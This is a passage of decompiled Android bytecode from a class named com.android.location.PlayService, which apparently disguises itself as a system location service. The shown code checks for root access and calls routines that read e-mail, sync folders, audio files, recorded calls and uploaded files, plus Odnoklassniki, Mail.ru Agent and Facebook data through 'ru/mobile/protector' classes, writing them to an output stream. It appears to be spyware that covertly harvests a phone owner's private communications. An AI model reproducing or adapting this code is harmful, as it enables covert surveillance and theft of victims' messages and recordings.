    //   1216: getfield 987	com/android/location/PlayService:bIsRootInstall	Z
    //   1219: ifeq +5826 -> 7045
    //   1222: aload 17
    //   1224: astore 11
    //   1226: aload 16
    //   1228: astore 15
    //   1230: aload 18
    //   1232: astore 13
    //   1234: iload 4
    //   1236: istore_2
    //   1237: aload 20
    //   1239: astore 10
    //   1241: aload 16
    //   1243: astore 14
    //   1245: aload 19
    //   1247: astore 12
    //   1249: ldc_w 3488
    //   1252: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1255: iload 5
    //   1257: istore_3
    //   1258: aload 17
    //   1260: astore 11
    //   1262: aload 16
    //   1264: astore 15
    //   1266: aload 18
    //   1268: astore 13
    //   1270: iload 4
    //   1272: istore_2
    //   1273: aload 20
    //   1275: astore 10
    //   1277: aload 16
    //   1279: astore 14
    //   1281: aload 19
    //   1283: astore 12
    //   1285: aload_0
    //   1286: ldc -94
    //   1288: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1291: ifeq +39 -> 1330
    //   1294: aload 17
    //   1296: astore 11
    //   1298: aload 16
    //   1300: astore 15
    //   1302: aload 18
    //   1304: astore 13
    //   1306: iload 4
    //   1308: istore_2
    //   1309: aload 20
    //   1311: astore 10
    //   1313: aload 16
    //   1315: astore 14
    //   1317: aload 19
    //   1319: astore 12
    //   1321: iconst_0
    //   1322: aload_0
    //   1323: aload 16
    //   1325: invokevirtual 3493	com/android/location/PlayService:ReadEmail	(Ljava/io/OutputStream;)I
    //   1328: iadd
    //   1329: istore_3
    //   1330: iload_3
    //   1331: istore 4
    //   1333: aload 17
    //   1335: astore 11
    //   1337: aload 16
    //   1339: astore 15
    //   1341: aload 18
    //   1343: astore 13
    //   1345: iload_3
    //   1346: istore_2
    //   1347: aload 20
    //   1349: astore 10
    //   1351: aload 16
    //   1353: astore 14
    //   1355: aload 19
    //   1357: astore 12
    //   1359: aload_0
    //   1360: aload 16
    //   1362: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   1365: ifeq +77 -> 1442
    //   1368: iload_3
    //   1369: istore 4
    //   1371: aload 17
    //   1373: astore 11
    //   1375: aload 16
    //   1377: astore 15
    //   1379: aload 18
    //   1381: astore 13
    //   1383: iload_3
    //   1384: istore_2
    //   1385: aload 20
    //   1387: astore 10
    //   1389: aload 16
    //   1391: astore 14
    //   1393: aload 19
    //   1395: astore 12
    //   1397: getstatic 717	com/android/location/PlayService:sSyncFolder	Ljava/lang/String;
    //   1400: ldc_w 571
    //   1403: if_acmpeq +39 -> 1442
    //   1406: aload 17
    //   1408: astore 11
    //   1410: aload 16
    //   1412: astore 15
    //   1414: aload 18
    //   1416: astore 13
    //   1418: iload_3
    //   1419: istore_2
    //   1420: aload 20
    //   1422: astore 10
    //   1424: aload 16
    //   1426: astore 14
    //   1428: aload 19
    //   1430: astore 12
    //   1432: iload_3
    //   1433: aload_0
    //   1434: aload 16
    //   1436: invokevirtual 3498	com/android/location/PlayService:ReadSyncFolder	(Ljava/io/OutputStream;)I
    //   1439: iadd
    //   1440: istore 4
    //   1442: aload 17
    //   1444: astore 11
    //   1446: aload 16
    //   1448: astore 15
    //   1450: aload 18
    //   1452: astore 13
    //   1454: iload 4
    //   1456: istore_2
    //   1457: aload 20
    //   1459: astore 10
    //   1461: aload 16
    //   1463: astore 14
    //   1465: aload 19
    //   1467: astore 12
    //   1469: aload_0
    //   1470: getfield 950	com/android/location/PlayService:bRunNotFirstTime	Z
    //   1473: ifeq +7692 -> 9165
    //   1476: iload 4
    //   1478: istore_3
    //   1479: aload 17
    //   1481: astore 11
    //   1483: aload 16
    //   1485: astore 15
    //   1487: aload 18
    //   1489: astore 13
    //   1491: iload 4
    //   1493: istore_2
    //   1494: aload 20
    //   1496: astore 10
    //   1498: aload 16
    //   1500: astore 14
    //   1502: aload 19
    //   1504: astore 12
    //   1506: aload_0
    //   1507: ldc -96
    //   1509: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1512: ifeq +40 -> 1552
    //   1515: aload 17
    //   1517: astore 11
    //   1519: aload 16
    //   1521: astore 15
    //   1523: aload 18
    //   1525: astore 13
    //   1527: iload 4
    //   1529: istore_2
    //   1530: aload 20
    //   1532: astore 10
    //   1534: aload 16
    //   1536: astore 14
    //   1538: aload 19
    //   1540: astore 12
    //   1542: iload 4
    //   1544: aload_0
    //   1545: aload 16
    //   1547: invokevirtual 3501	com/android/location/PlayService:ReadAudioFiles	(Ljava/io/OutputStream;)I
    //   1550: iadd
    //   1551: istore_3
    //   1552: iload_3
    //   1553: istore 4
    //   1555: aload 17
    //   1557: astore 11
    //   1559: aload 16
    //   1561: astore 15
    //   1563: aload 18
    //   1565: astore 13
    //   1567: iload_3
    //   1568: istore_2
    //   1569: aload 20
    //   1571: astore 10
    //   1573: aload 16
    //   1575: astore 14
    //   1577: aload 19
    //   1579: astore 12
    //   1581: aload_0
    //   1582: iconst_4
    //   1583: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1586: ifeq +39 -> 1625
    //   1589: aload 17
    //   1591: astore 11
    //   1593: aload 16
    //   1595: astore 15
    //   1597: aload 18
    //   1599: astore 13
    //   1601: iload_3
    //   1602: istore_2
    //   1603: aload 20
    //   1605: astore 10
    //   1607: aload 16
    //   1609: astore 14
    //   1611: aload 19
    //   1613: astore 12
    //   1615: iload_3
    //   1616: aload_0
    //   1617: aload 16
    //   1619: invokespecial 3503	com/android/location/PlayService:ReadAudioListenFiles	(Ljava/io/OutputStream;)I
    //   1622: iadd
    //   1623: istore 4
    //   1625: aload 17
    //   1627: astore 11
    //   1629: aload 16
    //   1631: astore 15
    //   1633: aload 18
    //   1635: astore 13
    //   1637: iload 4
    //   1639: istore_2
    //   1640: aload 20
    //   1642: astore 10
    //   1644: aload 16
    //   1646: astore 14
    //   1648: aload 19
    //   1650: astore 12
    //   1652: iload 4
    //   1654: aload_0
    //   1655: aload 16
    //   1657: invokespecial 3505	com/android/location/PlayService:ReadFileUpload	(Ljava/io/OutputStream;)I
    //   1660: iadd
    //   1661: istore 5
    //   1663: iload 5
    //   1665: istore_3
    //   1666: iload 5
    //   1668: ifne +156 -> 1824
    //   1671: iload 5
    //   1673: istore 4
    //   1675: aload 17
    //   1677: astore 11
    //   1679: aload 16
    //   1681: astore 15
    //   1683: aload 18
    //   1685: astore 13
    //   1687: iload 5
    //   1689: istore_2
    //   1690: aload 20
    //   1692: astore 10
    //   1694: aload 16
    //   1696: astore 14
    //   1698: aload 19
    //   1700: astore 12
    //   1702: aload_0
    //   1703: ldc -96
    //   1705: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1708: ifeq +41 -> 1749
    //   1711: aload 17
    //   1713: astore 11
    //   1715: aload 16
    //   1717: astore 15
    //   1719: aload 18
    //   1721: astore 13
    //   1723: iload 5
    //   1725: istore_2
    //   1726: aload 20
    //   1728: astore 10
    //   1730: aload 16
    //   1732: astore 14
    //   1734: aload 19
    //   1736: astore 12
    //   1738: iload 5
    //   1740: aload_0
    //   1741: aload 16
    //   1743: invokevirtual 3508	com/android/location/PlayService:ReadLostAudioCalls	(Ljava/io/OutputStream;)I
    //   1746: iadd
    //   1747: istore 4
    //   1749: iload 4
    //   1751: istore_3
    //   1752: aload 17
    //   1754: astore 11
    //   1756: aload 16
    //   1758: astore 15
    //   1760: aload 18
    //   1762: astore 13
    //   1764: iload 4
    //   1766: istore_2
    //   1767: aload 20
    //   1769: astore 10
    //   1771: aload 16
    //   1773: astore 14
    //   1775: aload 19
    //   1777: astore 12
    //   1779: aload_0
    //   1780: iconst_4
    //   1781: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1784: ifeq +40 -> 1824
    //   1787: aload 17
    //   1789: astore 11
    //   1791: aload 16
    //   1793: astore 15
    //   1795: aload 18
    //   1797: astore 13
    //   1799: iload 4
    //   1801: istore_2
    //   1802: aload 20
    //   1804: astore 10
    //   1806: aload 16
    //   1808: astore 14
    //   1810: aload 19
    //   1812: astore 12
    //   1814: iload 4
    //   1816: aload_0
    //   1817: aload 16
    //   1819: invokevirtual 3511	com/android/location/PlayService:ReadLostAudioListen	(Ljava/io/OutputStream;)I
    //   1822: iadd
    //   1823: istore_3
    //   1824: iload_3
    //   1825: istore 4
    //   1827: aload 17
    //   1829: astore 11
    //   1831: aload 16
    //   1833: astore 15
    //   1835: aload 18
    //   1837: astore 13
    //   1839: iload_3
    //   1840: istore_2
    //   1841: aload 20
    //   1843: astore 10
    //   1845: aload 16
    //   1847: astore 14
    //   1849: aload 19
    //   1851: astore 12
    //   1853: aload_0
    //   1854: aload 16
    //   1856: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   1859: ifeq +4086 -> 5945
    //   1862: iload_3
    //   1863: istore 4
    //   1865: aload 17
    //   1867: astore 11
    //   1869: aload 16
    //   1871: astore 15
    //   1873: aload 18
    //   1875: astore 13
    //   1877: iload_3
    //   1878: istore_2
    //   1879: aload 20
    //   1881: astore 10
    //   1883: aload 16
    //   1885: astore 14
    //   1887: aload 19
    //   1889: astore 12
    //   1891: aload_0
    //   1892: aload 16
    //   1894: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   1897: ifeq +473 -> 2370
    //   1900: iload_3
    //   1901: istore 4
    //   1903: aload 17
    //   1905: astore 11
    //   1907: aload 16
    //   1909: astore 15
    //   1911: aload 18
    //   1913: astore 13
    //   1915: iload_3
    //   1916: istore_2
    //   1917: aload 20
    //   1919: astore 10
    //   1921: aload 16
    //   1923: astore 14
    //   1925: aload 19
    //   1927: astore 12
    //   1929: aload_0
    //   1930: ldc -78
    //   1932: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1935: ifeq +435 -> 2370
    //   1938: iload_3
    //   1939: istore 4
    //   1941: aload 17
    //   1943: astore 11
    //   1945: aload 16
    //   1947: astore 15
    //   1949: aload 18
    //   1951: astore 13
    //   1953: iload_3
    //   1954: istore_2
    //   1955: aload 20
    //   1957: astore 10
    //   1959: aload 16
    //   1961: astore 14
    //   1963: aload 19
    //   1965: astore 12
    //   1967: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   1970: getstatic 579	com/android/location/PlayService:CAN	B
    //   1973: if_icmpne +397 -> 2370
    //   1976: aload 17
    //   1978: astore 11
    //   1980: aload 16
    //   1982: astore 15
    //   1984: aload 18
    //   1986: astore 13
    //   1988: iload_3
    //   1989: istore_2
    //   1990: aload 20
    //   1992: astore 10
    //   1994: aload 16
    //   1996: astore 14
    //   1998: aload 19
    //   2000: astore 12
    //   2002: new 864	java/lang/StringBuilder
    //   2005: dup
    //   2006: ldc_w 3513
    //   2009: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2012: getstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   2015: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   2018: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2021: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2024: aload 17
    //   2026: astore 11
    //   2028: aload 16
    //   2030: astore 15
    //   2032: aload 18
    //   2034: astore 13
    //   2036: iload_3
    //   2037: istore_2
    //   2038: aload 20
    //   2040: astore 10
    //   2042: aload 16
    //   2044: astore 14
    //   2046: aload 19
    //   2048: astore 12
    //   2050: getstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   2053: istore 5
    //   2055: aload 17
    //   2057: astore 11
    //   2059: aload 16
    //   2061: astore 15
    //   2063: aload 18
    //   2065: astore 13
    //   2067: iload_3
    //   2068: istore_2
    //   2069: aload 20
    //   2071: astore 10
    //   2073: aload 16
    //   2075: astore 14
    //   2077: aload 19
    //   2079: astore 12
    //   2081: iload 5
    //   2083: iconst_1
    //   2084: isub
    //   2085: putstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   2088: iload_3
    //   2089: istore 4
    //   2091: iload 5
    //   2093: ifgt +277 -> 2370
    //   2096: aload 17
    //   2098: astore 11
    //   2100: aload 16
    //   2102: astore 15
    //   2104: aload 18
    //   2106: astore 13
    //   2108: iload_3
    //   2109: istore_2
    //   2110: aload 20
    //   2112: astore 10
    //   2114: aload 16
    //   2116: astore 14
    //   2118: aload 19
    //   2120: astore 12
    //   2122: new 864	java/lang/StringBuilder
    //   2125: dup
    //   2126: ldc_w 3515
    //   2129: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2132: getstatic 627	com/android/location/PlayService:lOKAttCounter	J
    //   2135: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   2138: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2141: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2144: aload 17
    //   2146: astore 11
    //   2148: aload 16
    //   2150: astore 15
    //   2152: aload 18
    //   2154: astore 13
    //   2156: iload_3
    //   2157: istore_2
    //   2158: aload 20
    //   2160: astore 10
    //   2162: aload 16
    //   2164: astore 14
    //   2166: aload 19
    //   2168: astore 12
    //   2170: iconst_0
    //   2171: putstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   2174: aload 17
    //   2176: astore 11
    //   2178: aload 16
    //   2180: astore 15
    //   2182: aload 18
    //   2184: astore 13
    //   2186: iload_3
    //   2187: istore_2
    //   2188: aload 20
    //   2190: astore 10
    //   2192: aload 16
    //   2194: astore 14
    //   2196: aload 19
    //   2198: astore 12
    //   2200: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   2203: aload 16
    //   2205: getstatic 627	com/android/location/PlayService:lOKAttCounter	J
    //   2208: lconst_1
    //   2209: ladd
    //   2210: invokestatic 3521	ru/mobile/protector/OdnoklassnikiRT:ReadFile	(Landroid/content/Context;Ljava/io/OutputStream;J)J
    //   2213: lstore 7
    //   2215: lload 7
    //   2217: lconst_0
    //   2218: lcmp
    //   2219: ifeq +4894 -> 7113
    //   2222: aload 17
    //   2224: astore 11
    //   2226: aload 16
    //   2228: astore 15
    //   2230: aload 18
    //   2232: astore 13
    //   2234: iload_3
    //   2235: istore_2
    //   2236: aload 20
    //   2238: astore 10
    //   2240: aload 16
    //   2242: astore 14
    //   2244: aload 19
    //   2246: astore 12
    //   2248: lload 7
    //   2250: getstatic 627	com/android/location/PlayService:lOKAttCounter	J
    //   2253: lcmp
    //   2254: ifeq +4859 -> 7113
    //   2257: aload 17
    //   2259: astore 11
    //   2261: aload 16
    //   2263: astore 15
    //   2265: aload 18
    //   2267: astore 13
    //   2269: iload_3
    //   2270: istore_2
    //   2271: aload 20
    //   2273: astore 10
    //   2275: aload 16
    //   2277: astore 14
    //   2279: aload 19
    //   2281: astore 12
    //   2283: new 864	java/lang/StringBuilder
    //   2286: dup
    //   2287: ldc_w 3523
    //   2290: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2293: lload 7
    //   2295: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   2298: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2301: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2304: aload 17
    //   2306: astore 11
    //   2308: aload 16
    //   2310: astore 15
    //   2312: aload 18
    //   2314: astore 13
    //   2316: iload_3
    //   2317: istore_2
    //   2318: aload 20
    //   2320: astore 10
    //   2322: aload 16
    //   2324: astore 14
    //   2326: aload 19
    //   2328: astore 12
    //   2330: lload 7
    //   2332: putstatic 627	com/android/location/PlayService:lOKAttCounter	J
    //   2335: iload_3
    //   2336: iconst_1
    //   2337: iadd
    //   2338: istore 4
    //   2340: aload 17
    //   2342: astore 11
    //   2344: aload 16
    //   2346: astore 15
    //   2348: aload 18
    //   2350: astore 13
    //   2352: iload 4
    //   2354: istore_2
    //   2355: aload 20
    //   2357: astore 10
    //   2359: aload 16
    //   2361: astore 14
    //   2363: aload 19
    //   2365: astore 12
    //   2367: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   2370: iload 4
    //   2372: istore_3
    //   2373: aload 17
    //   2375: astore 11
    //   2377: aload 16
    //   2379: astore 15
    //   2381: aload 18
    //   2383: astore 13
    //   2385: iload 4
    //   2387: istore_2
    //   2388: aload 20
    //   2390: astore 10
    //   2392: aload 16
    //   2394: astore 14
    //   2396: aload 19
    //   2398: astore 12
    //   2400: aload_0
    //   2401: aload 16
    //   2403: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   2406: ifeq +481 -> 2887
    //   2409: iload 4
    //   2411: istore_3
    //   2412: aload 17
    //   2414: astore 11
    //   2416: aload 16
    //   2418: astore 15
    //   2420: aload 18
    //   2422: astore 13
    //   2424: iload 4
    //   2426: istore_2
    //   2427: aload 20
    //   2429: astore 10
    //   2431: aload 16
    //   2433: astore 14
    //   2435: aload 19
    //   2437: astore 12
    //   2439: aload_0
    //   2440: ldc -106
    //   2442: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   2445: ifeq +442 -> 2887
    //   2448: iload 4
    //   2450: istore_3
    //   2451: aload 17
    //   2453: astore 11
    //   2455: aload 16
    //   2457: astore 15
    //   2459: aload 18
    //   2461: astore 13
    //   2463: iload 4
    //   2465: istore_2
    //   2466: aload 20
    //   2468: astore 10
    //   2470: aload 16
    //   2472: astore 14
    //   2474: aload 19
    //   2476: astore 12
    //   2478: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   2481: getstatic 579	com/android/location/PlayService:CAN	B
    //   2484: if_icmpne +403 -> 2887
    //   2487: aload 17
    //   2489: astore 11
    //   2491: aload 16
    //   2493: astore 15
    //   2495: aload 18
    //   2497: astore 13
    //   2499: iload 4
    //   2501: istore_2
    //   2502: aload 20
    //   2504: astore 10
    //   2506: aload 16
    //   2508: astore 14
    //   2510: aload 19
    //   2512: astore 12
    //   2514: new 864	java/lang/StringBuilder
    //   2517: dup
    //   2518: ldc_w 3525
    //   2521: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2524: getstatic 689	com/android/location/PlayService:iPreventReadAgent	I
    //   2527: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   2530: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2533: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2536: aload 17
    //   2538: astore 11
    //   2540: aload 16
    //   2542: astore 15
    //   2544: aload 18
    //   2546: astore 13
    //   2548: iload 4
    //   2550: istore_2
    //   2551: aload 20
    //   2553: astore 10
    //   2555: aload 16
    //   2557: astore 14
    //   2559: aload 19
    //   2561: astore 12
    //   2563: getstatic 689	com/android/location/PlayService:iPreventReadAgent	I
    //   2566: istore 5
    //   2568: aload 17
    //   2570: astore 11
    //   2572: aload 16
    //   2574: astore 15
    //   2576: aload 18
    //   2578: astore 13
    //   2580: iload 4
    //   2582: istore_2
    //   2583: aload 20
    //   2585: astore 10
    //   2587: aload 16
    //   2589: astore 14
    //   2591: aload 19
    //   2593: astore 12
    //   2595: iload 5
    //   2597: iconst_1
    //   2598: isub
    //   2599: putstatic 689	com/android/location/PlayService:iPreventReadAgent	I
    //   2602: iload 4
    //   2604: istore_3
    //   2605: iload 5
    //   2607: ifgt +280 -> 2887
    //   2610: aload 17
    //   2612: astore 11
    //   2614: aload 16
    //   2616: astore 15
    //   2618: aload 18
    //   2620: astore 13
    //   2622: iload 4
    //   2624: istore_2
    //   2625: aload 20
    //   2627: astore 10
    //   2629: aload 16
    //   2631: astore 14
    //   2633: aload 19
    //   2635: astore 12
    //   2637: new 864	java/lang/StringBuilder
    //   2640: dup
    //   2641: ldc_w 3527
    //   2644: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2647: getstatic 625	com/android/location/PlayService:lAgentAttCounter	J
    //   2650: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   2653: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2656: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2659: aload 17
    //   2661: astore 11
    //   2663: aload 16
    //   2665: astore 15
    //   2667: aload 18
    //   2669: astore 13
    //   2671: iload 4
    //   2673: istore_2
    //   2674: aload 20
    //   2676: astore 10
    //   2678: aload 16
    //   2680: astore 14
    //   2682: aload 19
    //   2684: astore 12
    //   2686: iconst_0
    //   2687: putstatic 689	com/android/location/PlayService:iPreventReadAgent	I
    //   2690: aload 17
    //   2692: astore 11
    //   2694: aload 16
    //   2696: astore 15
    //   2698: aload 18
    //   2700: astore 13
    //   2702: iload 4
    //   2704: istore_2
    //   2705: aload 20
    //   2707: astore 10
    //   2709: aload 16
    //   2711: astore 14
    //   2713: aload 19
    //   2715: astore 12
    //   2717: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   2720: aload 16
    //   2722: getstatic 625	com/android/location/PlayService:lAgentAttCounter	J
    //   2725: invokestatic 3530	ru/mobile/protector/MailAgentRT:ReadFile	(Landroid/content/Context;Ljava/io/OutputStream;J)J
    //   2728: lstore 7
    //   2730: lload 7
    //   2732: lconst_0
    //   2733: lcmp
    //   2734: ifeq +4504 -> 7238
    //   2737: aload 17
    //   2739: astore 11
    //   2741: aload 16
    //   2743: astore 15
    //   2745: aload 18
    //   2747: astore 13
    //   2749: iload 4
    //   2751: istore_2
    //   2752: aload 20
    //   2754: astore 10
    //   2756: aload 16
    //   2758: astore 14
    //   2760: aload 19
    //   2762: astore 12
    //   2764: lload 7
    //   2766: getstatic 625	com/android/location/PlayService:lAgentAttCounter	J
    //   2769: lcmp
    //   2770: ifeq +4468 -> 7238
    //   2773: aload 17
    //   2775: astore 11
    //   2777: aload 16
    //   2779: astore 15
    //   2781: aload 18
    //   2783: astore 13
    //   2785: iload 4
    //   2787: istore_2
    //   2788: aload 20
    //   2790: astore 10
    //   2792: aload 16
    //   2794: astore 14
    //   2796: aload 19
    //   2798: astore 12
    //   2800: new 864	java/lang/StringBuilder
    //   2803: dup
    //   2804: ldc_w 3532
    //   2807: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2810: lload 7
    //   2812: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   2815: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2818: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2821: aload 17
    //   2823: astore 11
    //   2825: aload 16
    //   2827: astore 15
    //   2829: aload 18
    //   2831: astore 13
    //   2833: iload 4
    //   2835: istore_2
    //   2836: aload 20
    //   2838: astore 10
    //   2840: aload 16
    //   2842: astore 14
    //   2844: aload 19
    //   2846: astore 12
    //   2848: lload 7
    //   2850: putstatic 625	com/android/location/PlayService:lAgentAttCounter	J
    //   2853: iload 4
    //   2855: iconst_1
    //   2856: iadd
    //   2857: istore_3
    //   2858: aload 17
    //   2860: astore 11
    //   2862: aload 16
    //   2864: astore 15
    //   2866: aload 18
    //   2868: astore 13
    //   2870: iload_3
    //   2871: istore_2
    //   2872: aload 20
    //   2874: astore 10
    //   2876: aload 16
    //   2878: astore 14
    //   2880: aload 19
    //   2882: astore 12
    //   2884: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   2887: iload_3
    //   2888: istore 4
    //   2890: aload 17
    //   2892: astore 11
    //   2894: aload 16
    //   2896: astore 15
    //   2898: aload 18
    //   2900: astore 13
    //   2902: iload_3
    //   2903: istore_2
    //   2904: aload 20
    //   2906: astore 10
    //   2908: aload 16
    //   2910: astore 14
    //   2912: aload 19
    //   2914: astore 12
    //   2916: aload_0
    //   2917: aload 16
    //   2919: invokespecial 3495	com/android/location/PlayService:CanMORE	(Ljava/io/FileOutputStream;)Z
    //   2922: ifeq +471 -> 3393
    //   2925: iload_3
    //   2926: istore 4
    //   2928: aload 17
    //   2930: astore 11
    //   2932: aload 16
    //   2934: astore 15
    //   2936: aload 18
    //   2938: astore 13
    //   2940: iload_3
    //   2941: istore_2
    //   2942: aload 20
    //   2944: astore 10
    //   2946: aload 16
    //   2948: astore 14
    //   2950: aload 19
    //   2952: astore 12
    //   2954: aload_0
    //   2955: ldc -90
    //   2957: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   2960: ifeq +433 -> 3393
    //   2963: iload_3
    //   2964: istore 4
    //   2966: aload 17
    //   2968: astore 11
    //   2970: aload 16
    //   2972: astore 15
    //   2974: aload 18
    //   2976: astore 13
    //   2978: iload_3
    //   2979: istore_2
    //   2980: aload 20
    //   2982: astore 10
    //   2984: aload 16
    //   2986: astore 14
    //   2988: aload 19
    //   2990: astore 12
    //   2992: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   2995: getstatic 579	com/android/location/PlayService:CAN	B
    //   2998: if_icmpne +395 -> 3393
    //   3001: aload 17
    //   3003: astore 11
    //   3005: aload 16
    //   3007: astore 15
    //   3009: aload 18
    //   3011: astore 13
    //   3013: iload_3
    //   3014: istore_2
    //   3015: aload 20
    //   3017: astore 10
    //   3019: aload 16
    //   3021: astore 14
    //   3023: aload 19
    //   3025: astore 12
    //   3027: new 864	java/lang/StringBuilder
    //   3030: dup
    //   3031: ldc_w 3534
    //   3034: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3037: getstatic 687	com/android/location/PlayService:iPreventReadFB	I
    //   3040: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   3043: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3046: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3049: aload 17
    //   3051: astore 11
    //   3053: aload 16
    //   3055: astore 15
    //   3057: aload 18
    //   3059: astore 13
    //   3061: iload_3
    //   3062: istore_2
    //   3063: aload 20
    //   3065: astore 10
    //   3067: aload 16
    //   3069: astore 14
    //   3071: aload 19
    //   3073: astore 12
    //   3075: getstatic 687	com/android/location/PlayService:iPreventReadFB	I
    //   3078: istore 5
    //   3080: aload 17
    //   3082: astore 11
    //   3084: aload 16
    //   3086: astore 15
    //   3088: aload 18
    //   3090: astore 13
    //   3092: iload_3
    //   3093: istore_2
    //   3094: aload 20
    //   3096: astore 10
    //   3098: aload 16
    //   3100: astore 14
    //   3102: aload 19
    //   3104: astore 12
    //   3106: iload 5
    //   3108: iconst_1
    //   3109: isub
    //   3110: putstatic 687	com/android/location/PlayService:iPreventReadFB	I
    //   3113: iload_3
    //   3114: istore 4
    //   3116: iload 5
    //   3118: ifgt +275 -> 3393
    //   3121: aload 17
    //   3123: astore 11
    //   3125: aload 16
    //   3127: astore 15
    //   3129: aload 18
    //   3131: astore 13
    //   3133: iload_3
    //   3134: istore_2
    //   3135: aload 20
    //   3137: astore 10
    //   3139: aload 16
    //   3141: astore 14
    //   3143: aload 19
    //   3145: astore 12
    //   3147: new 864	java/lang/StringBuilder
    //   3150: dup
    //   3151: ldc_w 3536
    //   3154: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3157: getstatic 623	com/android/location/PlayService:lFBAttCounter	J
    //   3160: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   3163: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3166: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3169: aload 17
    //   3171: astore 11
    //   3173: aload 16
    //   3175: astore 15
    //   3177: aload 18
    //   3179: astore 13
    //   3181: iload_3
    //   3182: istore_2
    //   3183: aload 20
    //   3185: astore 10
    //   3187: aload 16
    //   3189: astore 14
    //   3191: aload 19
    //   3193: astore 12
    //   3195: iconst_0
    //   3196: putstatic 687	com/android/location/PlayService:iPreventReadFB	I
    //   3199: aload 17
    //   3201: astore 11
    //   3203: aload 16
    //   3205: astore 15
    //   3207: aload 18
    //   3209: astore 13
    //   3211: iload_3
    //   3212: istore_2
    //   3213: aload 20
    //   3215: astore 10
    //   3217: aload 16
    //   3219: astore 14
    //   3221: aload 19
    //   3223: astore 12
    //   3225: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   3228: aload 16
    //   3230: getstatic 623	com/android/location/PlayService:lFBAttCounter	J
    //   3233: invokestatic 3539	ru/mobile/protector/FacebookRT:ReadFile	(Landroid/content/Context;Ljava/io/OutputStream;J)J
    //   3236: lstore 7
    //   3238: lload 7
    //   3240: lconst_0
    //   3241: lcmp
    //   3242: ifeq +4124 -> 7366
    //   3245: aload 17
    //   3247: astore 11
    //   3249: aload 16
    //   3251: astore 15
    //   3253: aload 18
    //   3255: astore 13
    //   3257: iload_3
    //   3258: istore_2
    //   3259: aload 20
    //   3261: astore 10
    //   3263: aload 16
    //   3265: astore 14
    //   3267: aload 19
    //   3269: astore 12
    //   3271: lload 7
    //   3273: getstatic 623	com/android/location/PlayService:lFBAttCounter	J
    //   3276: lcmp
    //   3277: ifeq +4089 -> 7366
    //   3280: aload 17
    //   3282: astore 11
    //   3284: aload 16
    //   3286: astore 15
    //   3288: aload 18
    //   3290: astore 13
    //   3292: iload_3
    //   3293: istore_2
    //   3294: aload 20
    //   3296: astore 10
    //   3298: aload 16
    //   3300: astore 14
    //   3302: aload 19
    //   3304: astore 12
    //   3306: new 864	java/lang/StringBuilder
